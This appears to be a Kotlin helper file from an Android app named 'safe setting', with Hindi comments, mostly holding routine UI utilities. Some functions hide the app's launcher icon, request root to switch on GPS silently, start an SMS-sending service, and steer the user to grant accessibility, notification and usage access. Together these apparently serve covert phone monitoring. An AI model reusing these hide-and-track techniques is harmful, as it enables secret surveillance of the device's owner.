package com.safe.setting.app.utils

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.MediaStore
import android.provider.Settings
import android.view.View
import android.view.ViewTreeObserver
import android.view.WindowManager
import android.view.inputmethod.InputMethodManager
import android.widget.ImageView
import androidx.annotation.IdRes
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.content.res.AppCompatResources
import androidx.constraintlayout.widget.ConstraintLayout
import androidx.core.content.ContextCompat
import cn.pedant.SweetAlert.SweetAlertDialog
import com.bumptech.glide.GenericTransitionOptions
import com.bumptech.glide.Glide
import com.bumptech.glide.load.engine.DiskCacheStrategy
import com.bumptech.glide.request.RequestOptions
import com.daimajia.androidanimations.library.Techniques
import com.daimajia.androidanimations.library.YoYo
import com.google.android.material.appbar.AppBarLayout
import com.pawegio.kandroid.*
import com.safe.setting.app.R
import com.safe.setting.app.ui.activities.login.LoginActivity
import com.safe.setting.app.utils.async.AsyncTaskRootPermission
import com.safe.setting.app.utils.async.AsyncTaskRunCommand
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import com.safe.setting.app.ui.widget.toolbar.CustomToolbar


@Suppress("DEPRECATION")
object ConstFun {

    // BuildConfig से बिल्ड टाइप प्राप्त करता है।
    fun getPackageCheckSocial(): String = BuildConfig.BUILD_TYPE

    // वर्तमान समय के आधार पर एक रैंडम न्यूमेरिक स्ट्रिंग बनाता है।
    fun getRandomNumeric() : String = System.currentTimeMillis().toString()

    // व्यू के अंदर किसी आईडी से व्यू को ढूंढता है।
    inline fun <reified V : View> View.find(@IdRes id: Int): V = findViewById(id)

    // जांचता है कि क्या एंड्रॉइड संस्करण M (Marshmallow) या उससे ऊपर का है।
    fun isAndroidM(): Boolean = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M

    // जांचता है कि क्या एंड्रॉइड संस्करण O (Oreo) या उससे ऊपर का है।
    private fun isAndroidO() : Boolean = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O

    // डिवाइस को वाइब्रेट करता है।
    fun Context.setVibrate(milliseconds: Long) {
        val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        if (isAndroidO()) {
            vibrator.vibrate(VibrationEffect.createOneShot(milliseconds, VibrationEffect.DEFAULT_AMPLITUDE))
        } else {
            vibrator.vibrate(milliseconds)
        }
    }

    // किसी व्यू पर एनीमेशन चलाता है।
    fun View.viewAnimation(anim: Techniques, duration: Long) =
        YoYo.with(anim).duration(duration).pivot(YoYo.CENTER_PIVOT, YoYo.CENTER_PIVOT).playOn(this)!!

    // एनीमेशन के साथ एक नई एक्टिविटी शुरू करता है।
    inline fun <reified T : Any> Activity.startAnimateActivity(enterAnim:Int, exitAnim:Int) {
        startActivity<T>()
        finish()
        animateActivity(enterAnim,exitAnim)
    }

    // SMS भेजने के लिए सर्विस शुरू करता है।
    inline fun <reified S : Any> Context.startServiceSms(smsAddress:String,smsBody:String,type:Int){
        val myIntent = IntentFor<S>(this)
        myIntent.putExtra(Consts.SMS_ADDRESS,smsAddress)
        myIntent.putExtra(Consts.SMS_BODY,smsBody)
        myIntent.putExtra(Consts.TYPE_SMS,type)
        startService(myIntent)
    }

    // एक्टिविटी ट्रांजिशन एनीमेशन सेट करता है।
    fun Activity.animateActivity(enterAnim:Int, exitAnim:Int) = overridePendingTransition(enterAnim, exitAnim)

    // गैलरी खोलने के लिए इंटेंट शुरू करता है।
    fun Activity.openGallery() = Intent(Intent.ACTION_PICK,MediaStore.Images.Media.EXTERNAL_CONTENT_URI).also {
        it.flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
        it.type = "image/*"
        startActivityForResult(it,100)
    }

    // व्यू को दिखाता या छिपाता है।
    fun View.isShow(state: Boolean) = if (state) show() else hide()

    // ऐप के सिस्टम सेटिंग्स पेज को खोलता है।
    fun Context.openAppSystemSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
        val uri = Uri.fromParts("package", packageName, null)
        intent.data = uri
        startActivity(intent)
    }

    // एक थ्रेड चलाता है जो एक निश्चित अंतराल पर कोई क्रिया करता है।
    fun runThread(sleep: Long, action: () -> Unit): Thread = Thread {
        while (true) {
            try {
                Thread.sleep(sleep)
                (this as? Activity)?.runOnUiThread { action() }
            } catch (e: InterruptedException) {
                break
            }
        }
    }

    // वर्तमान दिनांक और समय प्राप्त करता है।
    fun getDateTime(): String {
        val dateFormat = SimpleDateFormat("dd MMM yyyy hh:mm a", Locale.US) // Or any other locale
        return dateFormat.format(Calendar.getInstance().time)
    }

    // एक कस्टम अलर्ट डायलॉग दिखाता है।
    fun Context.alertDialog(alertType: Int, title: Int, msg: String?, txtPositiveButton: Int?, cancellable: Boolean = false, action: SweetAlertDialog.() -> Unit): SweetAlertDialog {
        val dialog = SweetAlertDialog(this, alertType).apply {
            titleText = getString(title)
            setCancelable(cancellable)

            if (alertType != SweetAlertDialog.PROGRESS_TYPE) {
                contentText = msg
                confirmText = getString(txtPositiveButton!!)
                if (cancellable) cancelText = getString(android.R.string.cancel)
                showCancelButton(cancellable)
            } else progressHelper.barColor = ContextCompat.getColor(this@alertDialog, R.color.colorPrimary)
        }
        action(dialog)
        return dialog
    }

    // एक कस्टम व्यू के साथ अलर्ट डायलॉग दिखाता है।
    fun Context.alertDialog(v:View,cancellable: Boolean = false) : AlertDialog =
        AlertDialog.Builder(this).setView(v)
            .setCancelable(cancellable).create()


    // Glide का उपयोग करके एक ImageView में URL से इमेज लोड करता है।
    fun ImageView.setImageUrl(url: String, placeholder: Int) {
        Glide.with(this).load(url)
            .transition(GenericTransitionOptions.with(android.R.anim.fade_in))
            .apply(RequestOptions()
                .diskCacheStrategy(DiskCacheStrategy.ALL)
                .placeholder(AppCompatResources.getDrawable(context, placeholder))
            )
            .into(this)
    }

    // Glide का उपयोग करके एक ImageView में ड्रॉएबल आईडी से इमेज लोड करता है।
    fun ImageView.setImageId(drawable:Int){
        Glide.with(this).load(drawable)
            .transition(GenericTransitionOptions.with(android.R.anim.fade_in))
            .apply(RequestOptions().diskCacheStrategy(DiskCacheStrategy.ALL))
            .into(this)
    }

    // मिलीसेकंड को मिनट:सेकंड प्रारूप में परिवर्तित करता है।
    fun convertCurrentDuration(currentDuration: Long): String {
        val seconds = (currentDuration % 60000 / 1000).toString()
        val minutes = (currentDuration / 60000).toString()
        return if (seconds.length == 1) "$minutes:0$seconds" else "$minutes:$seconds"
    }

    // एक्सेसिबिलिटी सेटिंग्स खोलता है।
    fun Context.openAccessibilitySettings() = startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))

    // उपयोग एक्सेस सेटिंग्स खोलता है।
    fun Context.openUseAccessSettings() = startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))

    // नोटिफिकेशन लिसनर सेटिंग्स खोलता है।
    fun Context.openNotificationListenerSettings(){
        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
        startActivity(intent)
    }

    // बैटरी ऑप्टिमाइज़ेशन सेटिंग्स (व्हाइटलिस्ट) खोलता है।
    fun Context.openWhitelistSettings() {
        if (isAndroidM()) {
            if (!isIgnoringBatteryOptimizations()) {
                showBatteryOptimizationDialog()
            }
        }
    }

    private fun Context.showBatteryOptimizationDialog() {
        AlertDialog.Builder(this)
            .setTitle("Battery Optimization")
            .setMessage("To ensure uninterrupted use of our app, please disable battery optimization for our app.")
            .setPositiveButton("Go to Settings") { _, _ ->
                openBatteryOptimizationSettings()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun Context.openBatteryOptimizationSettings() {
        val intent = Intent().apply {
            action = Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS
        }

        try {
            startActivity(intent)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun Context.isIgnoringBatteryOptimizations(): Boolean {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager?
        return powerManager?.isIgnoringBatteryOptimizations(packageName) ?: false
    }

    // जांचता है कि डिवाइस रूटेड है या नहीं।
    fun isRoot() : Boolean {
        if (Build.TAGS != null && Build.TAGS.contains("test-keys")) return true
        val patch = arrayOf("/su/bin","/sbin", "/system/bin", "/system/sbin", "/system/xbin", "/data/local/xbin",
            "/data/local/bin", "/system/sd/xbin", "/system/bin/failsafe", "/vendor/bin", "/data/local")
        var result = false
        for (element in patch) if (File("$element/su").exists()){ result = true ; break }
        return result
    }

    // रूट अनुमति के लिए एसिंकटास्क चलाता है।
    fun Context.permissionRoot(result:(result:Boolean)->Unit) =
        AsyncTaskRootPermission(this){ result(it) }.execute()

    // रूट के साथ GPS को सक्षम करता है।
    fun enableGpsRoot() = AsyncTaskRunCommand(onPostFunc = { enableNetworkProviderRoot() }).execute(Consts.COMMAND_ENABLE_GPS_PROVIDER)
    private fun enableNetworkProviderRoot() = AsyncTaskRunCommand().execute(Consts.COMMAND_ENABLE_NETWORK_PROVIDER)


    // ऐप आइकन को लॉन्चर से दिखाता या छिपाता है।
    fun Context.showApp(state:Boolean){
        val componentName = ComponentName(this, LoginActivity::class.java)
        packageManager.setComponentEnabledSetting(componentName,
            if (state) PackageManager.COMPONENT_ENABLED_STATE_ENABLED else PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP)
    }

    // जांचता है कि नोटिफिकेशन सेवा चल रही है या नहीं।
    fun Context.isNotificationServiceRunning() : Boolean {
        val enabledNotificationListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return enabledNotificationListeners != null && enabledNotificationListeners.contains(packageName)
    }

    // जांचता है कि ऐप बैटरी ऑप्टिमाइज़ेशन से बाहर है या नहीं।
    fun Context.isAddWhitelist() : Boolean =
        if (isAndroidM()) {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            powerManager.isIgnoringBatteryOptimizations(packageName)
        }
        else true


    // कीबोर्ड को दिखाता या छिपाता है।
    fun View.showKeyboard(show:Boolean){
        val imm = context.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
        if (show) imm.showSoftInput(this, InputMethodManager.SHOW_IMPLICIT)
        else imm.hideSoftInputFromWindow(this.windowToken, 0)
    }

    // लेआउट को AppBar के नीचे एडजस्ट करता है।
    fun contentGlobalLayout(content: ConstraintLayout, appBar: AppBarLayout){
        content.viewTreeObserver.addOnGlobalLayoutListener(object : ViewTreeObserver.OnGlobalLayoutListener{
            override fun onGlobalLayout() {
                content.viewTreeObserver.removeOnGlobalLayoutListener(this)
                val appbarHeight = appBar.height
                content.translationY = -appbarHeight.toFloat()
                val params = content.layoutParams
                params.height = content.height + appbarHeight
                content.layoutParams = params
            }
        })
    }


    // फॉन्ट स्केल को एडजस्ट करता है।
    fun Context.adjustFontScale() {
        val configuration = resources.configuration
        if (configuration.fontScale > 1) {
            configuration.fontScale = 0.85f
            val metrics = resources.displayMetrics
            val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                windowManager.currentWindowMetrics.bounds
            } else {
                @Suppress("DEPRECATION")
                windowManager.defaultDisplay.getMetrics(metrics)
            }
            metrics.scaledDensity = configuration.fontScale * resources.displayMetrics.density
            resources.updateConfiguration(configuration, metrics)
        }
    }

    // टूलबार के स्क्रॉल व्यवहार को सेट करता है।
    fun isScrollToolbar(toolbar: CustomToolbar, state: Boolean){
        val params = toolbar.layoutParams as AppBarLayout.LayoutParams
        if (state) params.scrollFlags = AppBarLayout.LayoutParams.SCROLL_FLAG_SCROLL or AppBarLayout.LayoutParams.SCROLL_FLAG_ENTER_ALWAYS
        else params.scrollFlags = 0
    }
}
